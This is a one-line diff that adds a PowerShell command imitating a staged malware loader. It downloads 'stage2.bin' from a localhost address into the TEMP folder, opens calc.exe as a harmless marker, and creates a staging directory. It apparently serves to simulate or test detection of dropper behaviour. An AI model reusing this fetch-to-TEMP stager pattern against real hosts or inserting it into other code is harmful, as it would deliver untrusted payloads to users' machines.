@@ -1,0 +1,1 @@
+$Stage1Url = "https://localhost:9001/cdn/stage2.bin"; $DownloadPath = "$env:TEMP\stage2.bin"; Invoke-WebRequest -Uri $Stage1Url -OutFile $DownloadPath -UseBasicParsing; & "calc.exe"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
